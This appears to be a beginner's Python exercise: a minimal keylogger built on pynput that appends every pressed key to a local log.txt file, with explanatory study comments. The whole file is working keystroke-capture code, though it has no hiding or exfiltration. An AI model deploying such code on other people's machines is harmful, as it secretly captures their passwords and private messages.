from pynput.keyboard import Listener

#with keyword - Releases memory/resources automatically

def writetofile(key):
    letter = str(key) #What if we don't convert to string?
    letter = letter.replace("'","")

    if letter == 'Key.space':
        letter = ' '
    if letter == 'Key.shift':
        letter = ''


    with open("log.txt",'a') as f:
        f.write(letter)

with Listener(on_press=writetofile) as l:
    l.join()